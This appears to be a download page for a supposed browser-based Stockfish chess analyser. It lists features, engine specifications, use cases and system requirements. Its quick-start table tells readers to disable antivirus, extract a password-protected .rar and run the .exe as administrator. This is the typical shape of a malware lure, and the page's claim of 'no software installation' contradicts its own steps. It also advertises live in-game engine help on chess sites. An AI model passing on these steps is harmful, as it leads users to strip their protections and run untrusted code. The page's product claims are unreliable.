## QUICK START

| # | Action |
|---|--------|
| 1 | Download .rar using link above |
| 2 | Temporarily disable antivirus (after verification) |
| 3 | Extract archive with provided password |
| 4 | Right-click .exe → "Run as administrator" |
| 5 | Local server starts automatically |
| 6 | Open browser → Go to `http://localhost:8080` |
| 7 | Enter position or import from chess site |
| 8 | Click "Analyze" → Review results |
| 9 | **Re-enable antivirus immediately** |

---

## KEY FEATURES

▸ **Live Position Analysis** – Evaluate any board state with depth-adjustable engine calculation

▸ **Browser-Based Interface** – No software installation on local machine, runs entirely in browser

▸ **One-Click Import** – Grab FEN directly from Chess.com, Lichess, or any major platform

▸ **Multi-Variation Display** – View top 3-5 candidate moves with evaluation scores

▸ **Tactical Alert System** – Highlights checks, captures, threats, and forced sequences

▸ **Cloud Sync Option** – Save analysis to cloud account for cross-device access

▸ **Opening Report** – Identifies opening name and provides statistical win rates

▸ **Blunder Detection** – Flags critical mistakes in real-time during game review

▸ **Heat Map Visualization** – Shows strongest squares for each piece

▸ **PGN Export** – Save complete analysis with comments and variations

---

## ENGINE SPECIFICATIONS

```
• Engine: Stockfish 16 (web-optimized)
• Depth: Adjustable 1-30 ply
• Calculation Speed: ~2M nodes/second
• Multi-Variation: Up to 5 lines
• Tablebases: Syzygy 6-piece (online)
• Position Formats: FEN, PGN, EPD, image upload
• Compatibility: Chrome, Firefox, Edge, Safari
• Connection: Local server (no internet required after setup)
```

---

## USE CASES

★ **Live Game Assistance** – Analyze positions during correspondence games
★ **Post-Game Review** – Identify mistakes and missed opportunities
★ **Opening Preparation** – Explore variations before competitive play
★ **Tactics Training** – Solve puzzles with instant feedback
★ **Teaching Tool** – Demonstrate concepts to students in real-time
★ **Streaming Integration** – Overlay analysis on broadcasted games

---

## SYSTEM REQUIREMENTS

- Windows 7/8/10/11 (64-bit)
- 4GB RAM minimum (8GB recommended)
- 200MB free disk space
- Modern web browser (Chrome 90+, Firefox 88+, Edge 90+)
- Local network access for server mode

